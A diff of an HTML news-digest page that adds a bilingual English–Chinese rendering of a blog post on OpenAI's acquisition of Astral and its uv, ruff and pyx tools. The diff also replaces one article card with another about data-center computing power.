+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">这些工具也很受欢迎，提供了出色的开发者体验，但它们不像 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 那样具有关键的基础设施承载作用（load-bearing）。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">They do however resonate well with coding agent tools like <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> - giving an agent access to fast linting and type checking tools can help improve the quality of the code they generate.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">然而，它们与 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 等编码智能体（coding agent）工具非常契合——为智能体提供快速的代码检查（linting）和类型检查工具，有助于提升其生成代码的质量。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">I'm not convinced that integrating them into the coding agent itself as opposed to telling it when to run them will make a meaningful difference, but I may just not be imaginative enough here.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我并不确定将它们集成到编码智能体内部（而非告诉智能体何时运行它们）会产生实质性的差异，但也许是我想象力不够丰富。</p>
+
+<h3 style="margin:24px 0 12px;">What of pyx?</h3>
+<h4 style="margin:20px 0 10px;">pyx 将何去何从？</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Ever since <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> started to gain traction the Python community has been worrying about the strategic risk of a single VC-backed company owning a key piece of Python infrastructure. I wrote about one of those conversations in detail back in September 2024.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">自从 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 开始获得关注以来，Python 社区就一直担心一家由风险投资（VC-backed）支持的单一公司掌控关键 Python 基础设施所带来的战略性风险。我在 2024 年 9 月曾详细写过关于这类讨论的文章。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The conversation back then focused on what <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>'s business plan could be, which started to take form in August 2025 when they announced <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pyx</strong>, their private <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">PyPI</strong>-style package registry for organizations.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">当时的讨论聚焦于 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 可能的商业计划，这一计划在 2025 年 8 月开始成形，当时他们发布了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pyx</strong>——一个面向企业的私有 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">PyPI</strong> 风格包注册中心（package registry）。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">I'm less convinced that <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pyx</strong> makes sense within <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>, and it's notably absent from both the <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> announcement posts.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我不太确定 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pyx</strong> 在 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 内部是否合乎逻辑，而且值得注意的是，<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 和 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 的声明文章中都没有提及它。</p>
+
+<h3 style="margin:24px 0 12px;">Competitive dynamics</h3>
+<h4 style="margin:20px 0 10px;">竞争格局</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">An interesting aspect of this deal is how it might impact the competition between <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">这笔交易的一个有趣之处在于它可能如何影响 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 与 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 之间的竞争。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Both companies spent most of 2025 focused on improving the coding ability of their models, resulting in the November 2025 inflection point when coding agents went from often-useful to almost-indispensable tools for software development.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">两家公司在 2025 年的大部分时间都专注于提升其模型的编程能力，最终在 2025 年 11 月迎来了一个转折点（inflection point），编码智能体（coding agents）从"偶尔有用"变成了软件开发中"几乎不可或缺"的工具。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The competition between <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> is fierce. Those $200/month subscriptions add up to billions of dollars a year in revenue, for companies that very much need that money.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> 与 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 之间的竞争非常激烈。每月 200 美元的订阅费用累计起来每年能为这些公司带来数十亿美元的收入，而它们正非常需要这笔钱。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> acquired the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Bun</strong> JavaScript runtime in December 2025, an acquisition that looks somewhat similar in shape to <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 在 2025 年 12 月收购了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Bun</strong> JavaScript 运行时（runtime），这笔交易在形态上与 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的收购颇为相似。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Bun</strong> was already a core component of <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> and that acquisition looked to mainly be about ensuring that a crucial dependency stayed actively maintained. <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong>'s performance has increased significantly since then thanks to the efforts of <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Bun</strong>'s <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jarred Sumner</strong>.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Bun</strong> 早已是 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> 的核心组件，那次收购似乎主要是为了确保这一关键依赖项得到积极维护。此后，得益于 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Bun</strong> 的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jarred Sumner</strong> 的努力，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> 的性能显著提升。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">One bad version of this deal would be if <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> start using their ownership of <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> as leverage in their competition with <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong>.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">这笔交易的一个糟糕版本是，如果 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 开始利用其对 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 的所有权作为与 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 竞争的筹码。</p>
+
+<h3 style="margin:24px 0 12px;">Astral's quiet series A and B</h3>
+<h4 style="margin:20px 0 10px;">Astral 悄无声息的 A 轮与 B 轮融资</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">One detail that caught my eye from <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>'s announcement, in the section thanking the team, investors, and community:</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的声明中有一个细节引起了我的注意，在感谢团队、投资者和社区的段落中：</p>
+
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+Second, to our investors, especially <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Casey Aylward</strong> from <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Accel</strong>, who led our Seed and Series A, and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jennifer Li</strong> from <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Andreessen Horowitz</strong>, who led our Series B. As a first-time, technical, solo founder, you showed far more belief in me than I ever showed in myself, and I will never forget that.
+</blockquote>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">其次，感谢我们的投资者，特别是领投我们种子轮和 A 轮融资的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Accel</strong> 的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Casey Aylward</strong>，以及领投我们 B 轮融资的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Andreessen Horowitz</strong> 的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jennifer Li</strong>。作为一名首次创业的独立技术型创始人，你们对我的信任远超过我对自己的信任，我将永远铭记于心。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Second, to our investors, especially <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Casey Aylward</strong> from <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Accel</strong>, who led our Seed and Series A, and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jennifer Li</strong> from <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Andreessen Horowitz</strong>, who led our Series B. As a first-time, technical, solo founder, you showed far more belief in me than I ever showed in myself, and I will never forget that.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">其次，感谢我们的投资者，特别是领投我们种子轮和 A 轮融资的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Accel</strong> 的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Casey Aylward</strong>，以及领投我们 B 轮融资的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Andreessen Horowitz</strong> 的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jennifer Li</strong>。作为一名首次创业的独立技术型创始人，你们对我的信任远超过我对自己的信任，我将永远铭记于心。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">As far as I can tell neither the Series A nor the Series B were previously announced - I've only been able to find coverage of the original seed round from April 2023.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">据我所知，无论是 A 轮还是 B 轮融资此前都未曾公开宣布——我只能找到 2023 年 4 月原始种子轮（seed round）的相关报道。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Those investors presumably now get to exchange their stake in <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> for a piece of <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>. I wonder how much influence they had on <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>'s decision to sell.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">这些投资者现在大概可以将他们在 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的股权换成 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 的股份了。我很好奇他们对 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的出售决定有多大影响力。</p>
+
+<h3 style="margin:24px 0 12px;">Forking as a credible exit?</h3>
+<h4 style="margin:20px 0 10px;">分叉（Forking）能否成为可靠的退出策略？</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Armin Ronacher</strong> built <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rye</strong>, which was later taken over by <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> and effectively merged with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong>. In August 2024 he wrote about the risk involved in a VC-backed company owning a key piece of open source infrastructure and said the following (highlight mine):</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Armin Ronacher</strong> 创建了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rye</strong>，后来被 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 接管，并最终与 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 合并。2024 年 8 月，他撰文讨论了风险投资支持的公司掌控关键开源基础设施所带来的风险，并发表了以下观点（高亮部分为我所加）：</p>
+
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+However having seen the code and what <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> is doing, even in the worst possible future this is a very forkable and maintainable thing. I believe that even in case <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> shuts down or were to do something incredibly dodgy licensing wise, the community would be better off than before <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> existed.
+</blockquote>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">然而，看过代码并了解 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 在做什么之后，即使在最糟糕的未来，这也是一个非常易于分叉（forkable）和维护的项目。我相信，即使 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 倒闭，或者在许可协议方面做出极其可疑的举动，社区的状况也会比 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 诞生之前更好。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">However having seen the code and what <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> is doing, even in the worst possible future this is a very forkable and maintainable thing. I believe that even in case <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> shuts down or were to do something incredibly dodgy licensing wise, the community would be better off than before <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> existed.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">然而，看过代码并了解 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 在做什么之后，即使在最糟糕的未来，这也是一个非常易于分叉（forkable）和维护的项目。我相信，即使 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 倒闭，或者在许可协议方面做出极其可疑的举动，社区的状况也会比 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 诞生之前更好。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>'s own <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Douglas Creager</strong> emphasized this angle on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Hacker News</strong> today:</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Douglas Creager</strong> 今天在 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Hacker News</strong> 上强调了这一角度：</p>
+
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+All I can say is that right now, we're committed to maintaining our open-source tools with the same level of effort, care, and attention to detail as before. That does not change with this acquisition. No one can guarantee how motives, incentives, and decisions might change years down the line. But that's why we bake optionality into it with the tools being permissively licensed. That makes the worst-case scenarios have the shape of "fork and move on", and not "software disappears forever".
+</blockquote>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我只能说的是，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">right now</strong>（此时此刻），我们致力于以与以往同等的努力、关怀和对细节的关注来维护我们的开源工具。这一点不会因这次收购而改变。没有人能保证几年后的动机、激励和决策会如何变化。但这就是为什么我们通过宽松许可（permissively licensed）为工具内置了选择权（optionality）。这使得最坏情况下的局面是"分叉并继续前行"（fork and move on），而非"软件永远消失"。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">All I can say is that right now, we're committed to maintaining our open-source tools with the same level of effort, care, and attention to detail as before. That does not change with this acquisition. No one can guarantee how motives, incentives, and decisions might change years down the line. But that's why we bake optionality into it with the tools being permissively licensed. That makes the worst-case scenarios have the shape of "fork and move on", and not "software disappears forever".</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我只能说的是，此时此刻，我们致力于以与以往同等的努力、关怀和对细节的关注来维护我们的开源工具。这一点不会因这次收购而改变。没有人能保证几年后的动机、激励和决策会如何变化。但这就是为什么我们通过宽松许可为工具内置了选择权。这使得最坏情况下的局面是"分叉并继续前行"，而非"软件永远消失"。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">I like and trust the <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> team and I'm optimistic that their projects will be well-maintained in their new home.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我喜欢并信任 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 团队，我乐观地认为他们的项目在新东家那里会得到良好的维护。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> don't yet have much of a track record with respect to acquiring and maintaining open source projects. They've been on a bit of an acquisition spree over the past three months though, snapping up <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Promptfoo</strong> and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">OpenClaw</strong> (sort-of, they hired creator <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Peter Steinberger</strong> and are spinning OpenClaw off to a foundation), plus closed source LaTeX platform <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Crixet</strong> (now Prism).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 在收购和维护开源项目方面还没有太多 track record（过往记录）。不过，过去三个月他们一直在进行一系列收购，包括 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Promptfoo</strong> 和 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">OpenClaw</strong>（某种程度上，他们雇佣了创始人 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Peter Steinberger</strong> 并将 OpenClaw 剥离给一家基金会），以及闭源的 LaTeX 平台 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Crixet</strong>（现为 Prism）。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">If things do go south for <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> and the other <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> projects we'll get to see how credible the forking exit strategy turns out to be.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">如果 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 和其他 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 项目的状况真的恶化（go south），我们将会看到这种"分叉退出策略"（forking exit strategy）究竟有多可靠。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Tags: python, ai, rust, openai, ruff, uv, astral, charlie-marsh, coding-agents, codex-cli, ty</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">标签：python, ai, rust, openai, ruff, uv, astral, charlie-marsh, coding-agents, codex-cli, ty</p></div>
       <button class="toggle-btn" onclick="toggleTranslation(this)">展开全文翻译</button>
-      <a class="link" href="https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything" target="_blank">阅读原文 &rarr;</a>
+      <a class="link" href="https://simonwillison.net/2026/Mar/19/openai-acquiring-astral/#atom-everything" target="_blank">阅读原文 &rarr;</a>
     </div>
 
 <div class="article-card">
-      <div class="source">Lenny&#x27;s Newsletter</div>
+      <div class="source">Construction Physics</div>
       <div class="title-row">
-        <div class="title">LennyRPG 开发实录</div>
-        <span class="tone-pill" style="background:#d1fae5;color:#047857">🧪 实验记录</span>
+        <div class="title">How Much Computing Power is in a Data Center?</div>
+        <span class="tone-pill" style="background:#fef9c3;color:#a16207">💡 洞察</span>
       </div>
-      <div class="title-en">How I built LennyRPG</div>
-      <div class="tags"><span class="tag">游戏开发</span><span class="tag">AI应用</span><span class="tag">项目实战</span></div>
-      <div class="summary">非技术设计师 Ben Shih 分享了构建宝可梦风格 RPG 游戏 LennyRPG 的六步工作流程，详述了如何利用 AI 将 300 多期播客文字记录转化为游戏数据，以及在工具选型和开发决策中的关键经验。</div>
-      <div class="quotes-section">
-<div class="quote-block"><div class="quote-en">How to have AI interview you instead of writing the PRD yourself</div><div class="quote-zh">如何让 AI 面试你，而不是亲自撰写产品需求文档</div></div>
-<div class="quote-block"><div class="quote-en">When to pivot your framework, rather than force the wrong tool</div><div class="quote-zh">何时该更换框架，而非强行使用错误的工具</div></div>
-</div>
-      <div class="translation"><div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<img src="https://substackcdn.com/image/fetch/$s_!RCwr!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe90c516a-b472-47b3-8570-b7581df49571_3016x3016.png" alt="" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-文章封面：LennyRPG 游戏界面截图
-</p>
+      
+      <div class="tags"><span class="tag">数据中心</span><span class="tag">算力</span><span class="tag">AI</span><span class="tag">GPU</span></div>
+      <div class="summary">本文指出，衡量AI数据中心应以其计算能力（FLOPS）而非投资金额或耗电量为核心指标：一个配备10万H100等效GPU的典型数据中心算力相当于500万至1000万部iPhone 16，而Meta规划的5吉瓦超大型数据中心则可媲美2亿至4亿部iPhone，凸显了当前AI基建的空前规模。</div>
+      
+      <div class="translation"><h3 style="margin:24px 0 12px;">How Much Computing Power is in a Data Center?</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-If you're a premium subscriber
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-如果你是<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">付费订阅（premium）</strong>用户
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Every day there's some new story about the enormous amounts of investment in building AI data centers. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">The Wall Street Journal</strong> reports that, as a fraction of GDP, AI capital spending in 2026 alone will be more than was spent on the decade-long build-up of the national railroad system, federal expenditures to create the interstate highway system, or the entire Apollo program. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Bloomberg</strong> reports that AI data center spending might reach as much as $3 trillion. The Electric Power Research Institute is projecting that data centers will consume up to 17% of all US electricity by 2030.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">每天都有关于建设<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AI data centers</strong>（AI数据中心）巨额投资的新报道。《华尔街日报》报道称，作为GDP的一部分，仅2026年的AI资本支出就将超过美国铁路系统十年建设期、州际公路系统联邦支出或整个阿波罗计划的总投入。彭博社报道称，AI数据中心支出可能高达3万亿美元。美国电力研究院预测，到2030年，数据中心将消耗全美电力的17%。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Add the private feed to your podcast app at <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">add.lennysreads.com</strong>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-请在 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">add.lennysreads.com</strong> 将私人订阅源添加到你的播客应用中
-</p>
+<img src="https://substackcdn.com/image/fetch/$s_!Z3qT!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1371941-d55a-483e-9849-33e3cb1f2bc7_644x320.png" alt="AI investment comparison" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
